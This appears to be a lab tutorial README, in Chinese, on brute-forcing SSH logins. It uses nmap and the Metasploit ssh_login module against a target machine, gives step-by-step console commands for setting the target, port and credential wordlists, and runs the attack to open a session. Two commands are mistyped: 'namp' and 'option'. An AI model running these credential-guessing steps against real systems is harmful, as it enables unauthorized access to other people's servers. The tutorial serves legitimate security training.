# brute-force SSH login
使用Metasploit暴力猜測ssh的登入帳密。

## **環境&工具**
* 一台Kali Linux
* 一台有ssh服務的靶機
* 一個字典檔

## **破解流程**
* step1：針對目標機器做掃描，掃描這台主機有開那些服務
  > * 這邊使用nmap這套工具做掃描，檢測目標主機是否在線上、port開放的情況
  > * nmap其他相關指令請參考https://zh.wikipedia.org/zh-tw/Nmap
  > ```shell
  > namp -sV xxx.xxx.xxx.xxx
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/1.png)
* step2：開啟Metasploit
  > ```shell
  > msfconsole
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/2-1.png)
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/2-2.png)
* step3：開啟Metasploit這套工具尋找模組腳本
  > * 這邊使用模組名稱是`auxiliary/scanner/ssh/ssh_login`
  > ```shell
  > search ssh_login
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/3.png)
* step4：查看使用的模組腳本需要設定的參數
  > * 這邊四個重要的參數必須設定，`目標主機IP`、`目標主機port號`、`使用者帳號`、`使用者密碼`
  > ```shell
  > option
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/4.png)
* step5：設定目標主機IP
  > ```shell
  > set rhost xxx.xxx.xxx.xxx
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/5.png)  
* step6：目標主機port號
  > ```shell
  > set rport xx
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/6.png)
* step7：設定使用者帳號密碼
  > * 設定使用者帳號及使用者密碼的方式有三種，`利用username及password的字典檔`、`分別給username及password的字典檔`、`直接設定username及password`

  * 利用username及password的字典檔  
    > 檔案格式為
    > 
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/7.png)   
    > ```shell
    > set userpass_file [檔案路徑]
    > ```
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/8.png)    

  * 分別給username及password的字典檔 
    > 檔案格式為
    > 
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/9.png)   
    > ```shell
    > set user_file [檔案路徑]
    > ```
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/10.png)   
    > ```shell
    > set pass_file [檔案路徑]
    > ```
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/11.png)     
  
  * 直接設定username及password  
    > ```shell
    > set username [名稱]
    > set password [密碼]
    > ```
    > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/12.png)   

  ```
  設定使用者帳號密碼，可使用字典檔也可自行輸入，可搭配自行輸入及字典檔的組合，更快速的找到登入的帳密。
  ```

* step8：執行暴力猜測ssh的登入帳密
  > ```shell
  > exploit
  > ```
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/13.png)
  > * 執行成功後會有一個session存在著
  > ![image](https://github.com/WanShannn/BruteForce-SSH-Login/blob/main/result/14.png)

## **References**
* https://charlesreid1.com/wiki/Metasploitable/SSH/Exploits
